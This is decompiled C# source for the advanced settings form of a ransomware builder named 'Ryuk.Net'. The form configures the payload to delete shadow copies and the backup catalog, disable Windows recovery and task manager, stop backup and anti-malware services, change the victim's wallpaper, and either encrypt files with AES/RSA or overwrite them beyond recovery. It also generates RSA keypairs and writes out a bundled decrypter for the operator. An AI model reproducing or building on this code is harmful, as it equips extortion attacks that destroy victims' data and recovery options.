using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Windows.Forms;
using System.Xml.Serialization;
using CustomWindowsForm;
using Ryuk.Net.Properties;

namespace Ryuk.Net;

public class advancedSettingForm : Form
{
	private bool mouseDown;

	private Point lastLocation;

	private IContainer components = null;

	private Panel panel1;

	private ButtonZ buttonZ1;

	private CheckBox deleteBackupCatalogCheckbox;

	private CheckBox disableRecoveryModeCheckbox;

	private CheckBox deleteShadowCopiesCheckbox;

	private CheckBox resistAdminCheckbox;

	private Label label1;

	private OpenFileDialog openFileDialog1;

	private Label pathToXmlLabel;

	private Button button2;

	private TextBox textBox1;

	private Label label2;

	private Label label3;

	private TextBox pathToImageText;

	private Button button1;

	private RadioButton radioButton2;

	private RadioButton radioButton1;

	private Label overwriteInfoLabel;

	private CheckBox taskManager;

	private CheckBox stopBackupsCheckbox;

	public advancedSettingForm()
	{
		InitializeComponent();
	}

	private void advancedSettingForm_Load(object sender, EventArgs e)
	{
		if (Settings.Default.checkAdminPrivilage)
		{
			resistAdminCheckbox.set_Checked(true);
		}
		else
		{
			resistAdminCheckbox.set_Checked(false);
		}
		_ = Settings.Default.encryptOption;
		string decrypterName = Settings.Default.decrypterName;
		if (decrypterName == "")
		{
			((Control)textBox1).set_Enabled(true);
		}
		else
		{
			((Control)textBox1).set_Text(decrypterName);
			((Control)textBox1).set_Enabled(false);
			((Control)button2).set_Text("Public key selected");
		}
		string pathToBase = Settings.Default.pathToBase64;
		if (pathToBase != "")
		{
			((Control)pathToImageText).set_Text(pathToBase);
		}
	}

	private void buttonZ1_Click(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void advancedSettingForm_MouseDown(object sender, MouseEventArgs e)
	{
		mouseDown = true;
		lastLocation = e.get_Location();
	}

	private void advancedSettingForm_MouseMove(object sender, MouseEventArgs e)
	{
		if (mouseDown)
		{
			((Form)this).set_Location(new Point(((Form)this).get_Location().X - lastLocation.X + e.get_X(), ((Form)this).get_Location().Y - lastLocation.Y + e.get_Y()));
			((Control)this).Update();
		}
	}

	private void advancedSettingForm_MouseUp(object sender, MouseEventArgs e)
	{
		mouseDown = false;
	}

	private void buttonZ1_Click_1(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void resistAdminCheckbox_CheckedChanged(object sender, EventArgs e)
	{
		if (resistAdminCheckbox.get_Checked())
		{
			Settings.Default.checkAdminPrivilage = true;
			((Control)deleteShadowCopiesCheckbox).set_Enabled(true);
			((Control)disableRecoveryModeCheckbox).set_Enabled(true);
			((Control)deleteBackupCatalogCheckbox).set_Enabled(true);
			deleteShadowCopiesCheckbox.set_Checked(true);
			disableRecoveryModeCheckbox.set_Checked(true);
			deleteBackupCatalogCheckbox.set_Checked(true);
			taskManager.set_Checked(true);
			((Control)taskManager).set_Enabled(true);
			stopBackupsCheckbox.set_Checked(true);
			((Control)stopBackupsCheckbox).set_Enabled(true);
		}
		else
		{
			Settings.Default.checkAdminPrivilage = false;
			((Control)deleteShadowCopiesCheckbox).set_Enabled(false);
			((Control)disableRecoveryModeCheckbox).set_Enabled(false);
			((Control)deleteBackupCatalogCheckbox).set_Enabled(false);
			deleteShadowCopiesCheckbox.set_Checked(false);
			disableRecoveryModeCheckbox.set_Checked(false);
			deleteBackupCatalogCheckbox.set_Checked(false);
			taskManager.set_Checked(false);
			((Control)taskManager).set_Enabled(false);
			stopBackupsCheckbox.set_Checked(false);
			((Control)stopBackupsCheckbox).set_Enabled(false);
		}
	}

	private void panel1_Paint(object sender, PaintEventArgs e)
	{
	}

	private void panel1_MouseMove(object sender, MouseEventArgs e)
	{
		if (mouseDown)
		{
			((Form)this).set_Location(new Point(((Form)this).get_Location().X - lastLocation.X + e.get_X(), ((Form)this).get_Location().Y - lastLocation.Y + e.get_Y()));
			((Control)this).Update();
		}
	}

	private void panel1_MouseUp(object sender, MouseEventArgs e)
	{
		mouseDown = false;
	}

	private void panel1_MouseDown(object sender, MouseEventArgs e)
	{
		mouseDown = true;
		lastLocation = e.get_Location();
	}

	private void deleteShadowCopiesCheckbox_CheckedChanged(object sender, EventArgs e)
	{
		if (deleteShadowCopiesCheckbox.get_Checked())
		{
			Settings.Default.deleteShadowCopies = true;
		}
		else
		{
			Settings.Default.deleteShadowCopies = false;
		}
	}

	private void deleteBackupCatalogCheckbox_CheckedChanged(object sender, EventArgs e)
	{
		if (deleteBackupCatalogCheckbox.get_Checked())
		{
			Settings.Default.deleteBackupCatalog = true;
		}
		else
		{
			Settings.Default.deleteBackupCatalog = false;
		}
	}

	private void disableRecoveryModeCheckbox_CheckedChanged(object sender, EventArgs e)
	{
		if (disableRecoveryModeCheckbox.get_Checked())
		{
			Settings.Default.disableRecoveryMode = true;
		}
		else
		{
			Settings.Default.disableRecoveryMode = false;
		}
	}

	private void radioButton1_CheckedChanged(object sender, EventArgs e)
	{
		((Control)button2).set_Visible(false);
		((Control)textBox1).set_Visible(false);
		((Control)label2).set_Visible(false);
		((Control)overwriteInfoLabel).set_Text("This function works faster but files cannot be returned ");
		Settings.Default.encryptOption = false;
	}

	private void radioButton2_CheckedChanged(object sender, EventArgs e)
	{
		((Control)button2).set_Visible(true);
		((Control)textBox1).set_Visible(true);
		((Control)label2).set_Visible(true);
		((Control)overwriteInfoLabel).set_Text("Files will be encrypted with AES / RSA method ");
		Settings.Default.encryptOption = true;
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Invalid comparison between Unknown and I4
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		OpenFileDialog val = new OpenFileDialog();
		((FileDialog)val).set_FilterIndex(1);
		if ((int)((CommonDialog)val).ShowDialog() == 1)
		{
			string fileName = ((FileDialog)val).get_FileName();
			string fileName2 = Path.GetFileName(fileName);
			((Control)textBox1).set_Text(fileName2);
			MessageBox.Show(fileName);
		}
	}

	private void decrypter(string decrypter)
	{
	}

	private void button2_Click(object sender, EventArgs e)
	{
		//IL_007b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0184: Unknown result type (might be due to invalid IL or missing references)
		//IL_01be: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_025a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0315: Unknown result type (might be due to invalid IL or missing references)
		//IL_034c: Unknown result type (might be due to invalid IL or missing references)
		RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		RSAParameters publicKey = rSACryptoServiceProvider.ExportParameters(includePrivateParameters: true);
		RSAParameters publicKey2 = rSACryptoServiceProvider.ExportParameters(includePrivateParameters: false);
		string keyString = GetKeyString(publicKey2);
		string keyString2 = GetKeyString(publicKey);
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly()!.Location);
		string text;
		if (((Control)textBox1).get_Text().Contains("-decrypter"))
		{
			text = ((Control)textBox1).get_Text();
			if (text == "")
			{
				MessageBox.Show("Decrypter name field is empty!");
				return;
			}
			if (Directory.Exists(text))
			{
				string path = directoryName + "\\" + text + "\\publicKey.yashma";
				Settings.Default.publicKey = File.ReadAllText(path);
				Settings.Default.decrypterName = text;
				MessageBox.Show("Public key selected successfully!");
				((Control)textBox1).set_Text(text);
				((Control)textBox1).set_Enabled(false);
				((Control)button2).set_Text("Public key selected");
				return;
			}
			try
			{
				Directory.CreateDirectory(text);
				string path = directoryName + "\\" + text + "\\publicKey.yashma";
				string path2 = directoryName + "\\" + text + "\\privateKey.yashma";
				File.WriteAllText(path, keyString);
				File.WriteAllText(path2, keyString2);
				byte[] bytes = Resources.decrypter;
				File.WriteAllBytes(directoryName + "\\" + text + "\\Decrypter.exe", bytes);
				Settings.Default.publicKey = File.ReadAllText(path);
				Settings.Default.decrypterName = text;
				MessageBox.Show("Decrypter created and public key selected successfully. Don't delete or move private key! Without private key files cannot be returned");
				((Control)textBox1).set_Text(text);
				((Control)textBox1).set_Enabled(false);
				((Control)button2).set_Text("Public key selected");
				return;
			}
			catch
			{
				MessageBox.Show("Unexpected error occured");
				return;
			}
		}
		text = ((Control)textBox1).get_Text() + "-decrypter";
		if (text == "-decrypter")
		{
			MessageBox.Show("Decrypter name field is empty!");
			return;
		}
		if (Directory.Exists(text) || Directory.Exists(text + "-decrypter"))
		{
			string path = directoryName + "\\" + text + "\\publicKey.yashma";
			Settings.Default.publicKey = File.ReadAllText(path);
			Settings.Default.decrypterName = text;
			MessageBox.Show("Decrypter exists. Public key selected successfully!");
			((Control)textBox1).set_Text(text);
			((Control)textBox1).set_Enabled(false);
			((Control)button2).set_Text("Public key selected");
			return;
		}
		try
		{
			Directory.CreateDirectory(text);
			string path = directoryName + "\\" + text + "\\publicKey.yashma";
			string path2 = directoryName + "\\" + text + "\\privateKey.yashma";
			File.WriteAllText(path, keyString);
			File.WriteAllText(path2, keyString2);
			byte[] bytes = Resources.decrypter;
			File.WriteAllBytes(directoryName + "\\" + text + "\\Decrypter.exe", bytes);
			Settings.Default.publicKey = File.ReadAllText(path);
			Settings.Default.decrypterName = text;
			MessageBox.Show("Decrypter created and public key selected successfully. Don't delete or move private key! Without private key files cannot be returned");
			((Control)textBox1).set_Text(text);
			((Control)textBox1).set_Enabled(false);
			((Control)button2).set_Text("Public key selected");
		}
		catch
		{
			MessageBox.Show("Unexpected error occured");
		}
	}

	public static string GetKeyString(RSAParameters publicKey)
	{
		StringWriter stringWriter = new StringWriter();
		XmlSerializer xmlSerializer = new XmlSerializer(typeof(RSAParameters));
		xmlSerializer.Serialize(stringWriter, publicKey);
		return stringWriter.ToString();
	}

	private void pathToXmlLabel_Click(object sender, EventArgs e)
	{
	}

	private void overwriteInfoLabel_Click(object sender, EventArgs e)
	{
	}

	private void textBox1_TextChanged(object sender, EventArgs e)
	{
	}

	private void label2_Click(object sender, EventArgs e)
	{
	}

	private void button1_Click_1(object sender, EventArgs e)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Expected O, but got Unknown
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Invalid comparison between Unknown and I4
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		try
		{
			OpenFileDialog val = new OpenFileDialog();
			((FileDialog)val).set_Filter("Image Files(*.jpg; *.jpeg; *.gif; *.bmp)|*.jpg; *.jpeg; *.gif; *.bmp");
			if ((int)((CommonDialog)val).ShowDialog() == 1)
			{
				((Control)pathToImageText).set_Text(((FileDialog)val).get_FileName());
				byte[] inArray = File.ReadAllBytes(((FileDialog)val).get_FileName());
				string text = Convert.ToBase64String(inArray);
				Settings.Default.base64Image = text;
				Settings.Default.pathToBase64 = ((FileDialog)val).get_FileName();
				File.WriteAllText(folderPath + "/sdf.txt", text);
			}
		}
		catch (Exception)
		{
			throw new ApplicationException("Failed loading image");
		}
	}

	private void taskManager_CheckedChanged(object sender, EventArgs e)
	{
		if (taskManager.get_Checked())
		{
			Settings.Default.disableTaskManager = true;
		}
		else
		{
			Settings.Default.disableTaskManager = false;
		}
	}

	private void stopBackupsCheckbox_CheckedChanged(object sender, EventArgs e)
	{
		if (stopBackupsCheckbox.get_Checked())
		{
			Settings.Default.stopBackupServices = true;
		}
		else
		{
			Settings.Default.stopBackupServices = false;
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_02e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ef: Expected O, but got Unknown
		//IL_02fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0306: Expected O, but got Unknown
		//IL_0313: Unknown result type (might be due to invalid IL or missing references)
		//IL_031d: Expected O, but got Unknown
		//IL_032a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0334: Expected O, but got Unknown
		//IL_04bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_04c9: Expected O, but got Unknown
		//IL_05de: Unknown result type (might be due to invalid IL or missing references)
		//IL_05e8: Expected O, but got Unknown
		//IL_0695: Unknown result type (might be due to invalid IL or missing references)
		//IL_069f: Expected O, but got Unknown
		//IL_07df: Unknown result type (might be due to invalid IL or missing references)
		//IL_07e9: Expected O, but got Unknown
		//IL_0899: Unknown result type (might be due to invalid IL or missing references)
		//IL_08a3: Expected O, but got Unknown
		//IL_0930: Unknown result type (might be due to invalid IL or missing references)
		//IL_093a: Expected O, but got Unknown
		//IL_09e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_09f1: Expected O, but got Unknown
		//IL_0ab9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ac3: Expected O, but got Unknown
		//IL_0b79: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b83: Expected O, but got Unknown
		//IL_0e34: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e3e: Expected O, but got Unknown
		//IL_0f2b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f35: Expected O, but got Unknown
		//IL_109e: Unknown result type (might be due to invalid IL or missing references)
		//IL_10a8: Expected O, but got Unknown
		//IL_10b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_10ba: Expected O, but got Unknown
		//IL_10c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_10cc: Expected O, but got Unknown
		panel1 = new Panel();
		stopBackupsCheckbox = new CheckBox();
		taskManager = new CheckBox();
		label3 = new Label();
		pathToImageText = new TextBox();
		button1 = new Button();
		label2 = new Label();
		textBox1 = new TextBox();
		button2 = new Button();
		pathToXmlLabel = new Label();
		overwriteInfoLabel = new Label();
		radioButton2 = new RadioButton();
		radioButton1 = new RadioButton();
		label1 = new Label();
		deleteBackupCatalogCheckbox = new CheckBox();
		disableRecoveryModeCheckbox = new CheckBox();
		deleteShadowCopiesCheckbox = new CheckBox();
		resistAdminCheckbox = new CheckBox();
		openFileDialog1 = new OpenFileDialog();
		buttonZ1 = new ButtonZ();
		((Control)panel1).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)panel1).set_BackColor(Color.FromArgb(30, 30, 30));
		((Control)panel1).get_Controls().Add((Control)(object)stopBackupsCheckbox);
		((Control)panel1).get_Controls().Add((Control)(object)taskManager);
		((Control)panel1).get_Controls().Add((Control)(object)label3);
		((Control)panel1).get_Controls().Add((Control)(object)pathToImageText);
		((Control)panel1).get_Controls().Add((Control)(object)button1);
		((Control)panel1).get_Controls().Add((Control)(object)label2);
		((Control)panel1).get_Controls().Add((Control)(object)textBox1);
		((Control)panel1).get_Controls().Add((Control)(object)button2);
		((Control)panel1).get_Controls().Add((Control)(object)pathToXmlLabel);
		((Control)panel1).get_Controls().Add((Control)(object)overwriteInfoLabel);
		((Control)panel1).get_Controls().Add((Control)(object)radioButton2);
		((Control)panel1).get_Controls().Add((Control)(object)radioButton1);
		((Control)panel1).get_Controls().Add((Control)(object)label1);
		((Control)panel1).get_Controls().Add((Control)(object)buttonZ1);
		((Control)panel1).get_Controls().Add((Control)(object)deleteBackupCatalogCheckbox);
		((Control)panel1).get_Controls().Add((Control)(object)disableRecoveryModeCheckbox);
		((Control)panel1).get_Controls().Add((Control)(object)deleteShadowCopiesCheckbox);
		((Control)panel1).get_Controls().Add((Control)(object)resistAdminCheckbox);
		((Control)panel1).set_Location(new Point(2, 1));
		((Control)panel1).set_Name("panel1");
		((Control)panel1).set_Size(new Size(352, 459));
		((Control)panel1).set_TabIndex(11);
		((Control)panel1).add_Paint(new PaintEventHandler(panel1_Paint));
		((Control)panel1).add_MouseDown(new MouseEventHandler(panel1_MouseDown));
		((Control)panel1).add_MouseMove(new MouseEventHandler(panel1_MouseMove));
		((Control)panel1).add_MouseUp(new MouseEventHandler(panel1_MouseUp));
		((Control)stopBackupsCheckbox).set_AutoSize(true);
		((Control)stopBackupsCheckbox).set_Cursor(Cursors.get_Hand());
		((Control)stopBackupsCheckbox).set_Enabled(false);
		((Control)stopBackupsCheckbox).set_ForeColor(Color.White);
		((Control)stopBackupsCheckbox).set_Location(new Point(70, 225));
		((Control)stopBackupsCheckbox).set_Name("stopBackupsCheckbox");
		((Control)stopBackupsCheckbox).set_Size(new Size(212, 17));
		((Control)stopBackupsCheckbox).set_TabIndex(35);
		((Control)stopBackupsCheckbox).set_Text("Stop backup and anti malware services");
		((ButtonBase)stopBackupsCheckbox).set_UseVisualStyleBackColor(true);
		stopBackupsCheckbox.add_CheckedChanged((EventHandler)stopBackupsCheckbox_CheckedChanged);
		((Control)taskManager).set_AutoSize(true);
		((Control)taskManager).set_Cursor(Cursors.get_Hand());
		((Control)taskManager).set_Enabled(false);
		((Control)taskManager).set_ForeColor(Color.White);
		((Control)taskManager).set_Location(new Point(70, 189));
		((Control)taskManager).set_Name("taskManager");
		((Control)taskManager).set_Size(new Size(128, 17));
		((Control)taskManager).set_TabIndex(34);
		((Control)taskManager).set_Text("Disable task manager");
		((ButtonBase)taskManager).set_UseVisualStyleBackColor(true);
		taskManager.add_CheckedChanged((EventHandler)taskManager_CheckedChanged);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_ForeColor(Color.White);
		((Control)label3).set_Location(new Point(19, 276));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(169, 16));
		((Control)label3).set_TabIndex(33);
		((Control)label3).set_Text("Change desktop wallpaper");
		((Control)pathToImageText).set_BackColor(Color.FromArgb(30, 30, 30));
		((Control)pathToImageText).set_ForeColor(Color.White);
		((Control)pathToImageText).set_Location(new Point(21, 299));
		((Control)pathToImageText).set_Name("pathToImageText");
		((Control)pathToImageText).set_Size(new Size(205, 20));
		((Control)pathToImageText).set_TabIndex(32);
		((Control)button1).set_BackColor(Color.FromArgb(30, 30, 30));
		((Control)button1).set_Cursor(Cursors.get_Hand());
		((Control)button1).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)button1).set_ForeColor(Color.White);
		((Control)button1).set_Location(new Point(232, 295));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(110, 26));
		((Control)button1).set_TabIndex(31);
		((Control)button1).set_Text("Select Image");
		((ButtonBase)button1).set_UseVisualStyleBackColor(false);
		((Control)button1).add_Click((EventHandler)button1_Click_1);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(Color.White);
		((Control)label2).set_Location(new Point(19, 391));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(107, 16));
		((Control)label2).set_TabIndex(30);
		((Control)label2).set_Text("Decrypter Name");
		((Control)label2).add_Click((EventHandler)label2_Click);
		((Control)textBox1).set_BackColor(Color.FromArgb(30, 30, 30));
		((Control)textBox1).set_ForeColor(Color.White);
		((Control)textBox1).set_Location(new Point(22, 410));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(159, 20));
		((Control)textBox1).set_TabIndex(29);
		((Control)textBox1).add_TextChanged((EventHandler)textBox1_TextChanged);
		((Control)button2).set_BackColor(Color.FromArgb(30, 30, 30));
		((Control)button2).set_Cursor(Cursors.get_Hand());
		((Control)button2).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)button2).set_ForeColor(Color.White);
		((Control)button2).set_Location(new Point(206, 404));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(136, 26));
		((Control)button2).set_TabIndex(28);
		((Control)button2).set_Text("Create Decrypter");
		((ButtonBase)button2).set_UseVisualStyleBackColor(false);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)pathToXmlLabel).set_AutoSize(true);
		((Control)pathToXmlLabel).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)pathToXmlLabel).set_ForeColor(Color.White);
		((Control)pathToXmlLabel).set_Location(new Point(24, 355));
		((Control)pathToXmlLabel).set_Name("pathToXmlLabel");
		((Control)pathToXmlLabel).set_Size(new Size(0, 16));
		((Control)pathToXmlLabel).set_TabIndex(26);
		((Control)pathToXmlLabel).add_Click((EventHandler)pathToXmlLabel_Click);
		((Control)overwriteInfoLabel).set_AutoSize(true);
		((Control)overwriteInfoLabel).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)overwriteInfoLabel).set_ForeColor(Color.White);
		((Control)overwriteInfoLabel).set_Location(new Point(22, 365));
		((Control)overwriteInfoLabel).set_Name("overwriteInfoLabel");
		((Control)overwriteInfoLabel).set_Size(new Size(275, 16));
		((Control)overwriteInfoLabel).set_TabIndex(24);
		((Control)overwriteInfoLabel).set_Text("Files will be encrypted with AES/RSA method");
		((Control)overwriteInfoLabel).add_Click((EventHandler)overwriteInfoLabel_Click);
		((Control)radioButton2).set_AutoSize(true);
		radioButton2.set_Checked(true);
		((Control)radioButton2).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)radioButton2).set_ForeColor(Color.White);
		((Control)radioButton2).set_Location(new Point(206, 345));
		((Control)radioButton2).set_Name("radioButton2");
		((Control)radioButton2).set_Size(new Size(142, 20));
		((Control)radioButton2).set_TabIndex(23);
		radioButton2.set_TabStop(true);
		((Control)radioButton2).set_Text("Encrypt  AES / RSA");
		((ButtonBase)radioButton2).set_UseVisualStyleBackColor(true);
		((Control)radioButton2).set_Visible(false);
		radioButton2.add_CheckedChanged((EventHandler)radioButton2_CheckedChanged);
		((Control)radioButton1).set_AutoSize(true);
		((Control)radioButton1).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)radioButton1).set_ForeColor(Color.White);
		((Control)radioButton1).set_Location(new Point(30, 345));
		((Control)radioButton1).set_Name("radioButton1");
		((Control)radioButton1).set_Size(new Size(126, 20));
		((Control)radioButton1).set_TabIndex(22);
		((Control)radioButton1).set_Text("Overwrite all files");
		((ButtonBase)radioButton1).set_UseVisualStyleBackColor(true);
		((Control)radioButton1).set_Visible(false);
		radioButton1.add_CheckedChanged((EventHandler)radioButton1_CheckedChanged);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 20.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.White);
		((Control)label1).set_Location(new Point(5, 8));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(301, 31));
		((Control)label1).set_TabIndex(21);
		((Control)label1).set_Text("Decrypter and options");
		((Control)deleteBackupCatalogCheckbox).set_AutoSize(true);
		((Control)deleteBackupCatalogCheckbox).set_Cursor(Cursors.get_Hand());
		((Control)deleteBackupCatalogCheckbox).set_Enabled(false);
		((Control)deleteBackupCatalogCheckbox).set_ForeColor(Color.White);
		((Control)deleteBackupCatalogCheckbox).set_Location(new Point(70, 120));
		((Control)deleteBackupCatalogCheckbox).set_Name("deleteBackupCatalogCheckbox");
		((Control)deleteBackupCatalogCheckbox).set_Size(new Size(152, 17));
		((Control)deleteBackupCatalogCheckbox).set_TabIndex(19);
		((Control)deleteBackupCatalogCheckbox).set_Text("Delete the backup catalog");
		((ButtonBase)deleteBackupCatalogCheckbox).set_UseVisualStyleBackColor(true);
		deleteBackupCatalogCheckbox.add_CheckedChanged((EventHandler)deleteBackupCatalogCheckbox_CheckedChanged);
		((Control)disableRecoveryModeCheckbox).set_AutoSize(true);
		((Control)disableRecoveryModeCheckbox).set_Cursor(Cursors.get_Hand());
		((Control)disableRecoveryModeCheckbox).set_Enabled(false);
		((Control)disableRecoveryModeCheckbox).set_ForeColor(Color.White);
		((Control)disableRecoveryModeCheckbox).set_Location(new Point(70, 155));
		((Control)disableRecoveryModeCheckbox).set_Name("disableRecoveryModeCheckbox");
		((Control)disableRecoveryModeCheckbox).set_Size(new Size(178, 17));
		((Control)disableRecoveryModeCheckbox).set_TabIndex(18);
		((Control)disableRecoveryModeCheckbox).set_Text("Disable windows recovery mode");
		((ButtonBase)disableRecoveryModeCheckbox).set_UseVisualStyleBackColor(true);
		disableRecoveryModeCheckbox.add_CheckedChanged((EventHandler)disableRecoveryModeCheckbox_CheckedChanged);
		((Control)deleteShadowCopiesCheckbox).set_AutoSize(true);
		((Control)deleteShadowCopiesCheckbox).set_Cursor(Cursors.get_Hand());
		((Control)deleteShadowCopiesCheckbox).set_Enabled(false);
		((Control)deleteShadowCopiesCheckbox).set_ForeColor(Color.White);
		((Control)deleteShadowCopiesCheckbox).set_Location(new Point(70, 84));
		((Control)deleteShadowCopiesCheckbox).set_Name("deleteShadowCopiesCheckbox");
		((Control)deleteShadowCopiesCheckbox).set_Size(new Size(190, 17));
		((Control)deleteShadowCopiesCheckbox).set_TabIndex(17);
		((Control)deleteShadowCopiesCheckbox).set_Text("Delete all Volumes Shadow Copies");
		((ButtonBase)deleteShadowCopiesCheckbox).set_UseVisualStyleBackColor(true);
		deleteShadowCopiesCheckbox.add_CheckedChanged((EventHandler)deleteShadowCopiesCheckbox_CheckedChanged);
		((Control)resistAdminCheckbox).set_AutoSize(true);
		((Control)resistAdminCheckbox).set_Cursor(Cursors.get_Hand());
		((Control)resistAdminCheckbox).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)resistAdminCheckbox).set_ForeColor(Color.White);
		((Control)resistAdminCheckbox).set_Location(new Point(57, 52));
		((Control)resistAdminCheckbox).set_Name("resistAdminCheckbox");
		((Control)resistAdminCheckbox).set_Size(new Size(212, 20));
		((Control)resistAdminCheckbox).set_TabIndex(16);
		((Control)resistAdminCheckbox).set_Text("Resist for admin privileges");
		((ButtonBase)resistAdminCheckbox).set_UseVisualStyleBackColor(true);
		resistAdminCheckbox.add_CheckedChanged((EventHandler)resistAdminCheckbox_CheckedChanged);
		((FileDialog)openFileDialog1).set_FileName("openFileDialog1");
		((Control)buttonZ1).set_Anchor((AnchorStyles)9);
		buttonZ1.BZBackColor = Color.FromArgb(30, 30, 30);
		buttonZ1.DisplayText = "X";
		((ButtonBase)buttonZ1).set_FlatStyle((FlatStyle)0);
		((Control)buttonZ1).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)buttonZ1).set_ForeColor(Color.White);
		((Control)buttonZ1).set_Location(new Point(321, 0));
		buttonZ1.MouseClickColor1 = Color.FromArgb(60, 60, 160);
		buttonZ1.MouseHoverColor = Color.FromArgb(50, 50, 50);
		((Control)buttonZ1).set_Name("buttonZ1");
		((Control)buttonZ1).set_Size(new Size(31, 24));
		((Control)buttonZ1).set_TabIndex(20);
		((Control)buttonZ1).set_Text("X");
		buttonZ1.TextLocation_X = 6;
		buttonZ1.TextLocation_Y = 1;
		((ButtonBase)buttonZ1).set_UseVisualStyleBackColor(true);
		((Control)buttonZ1).add_Click((EventHandler)buttonZ1_Click_1);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.FromArgb(25, 25, 25));
		((Form)this).set_ClientSize(new Size(356, 461));
		((Control)this).get_Controls().Add((Control)(object)panel1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("advancedSettingForm");
		((Form)this).set_ShowInTaskbar(false);
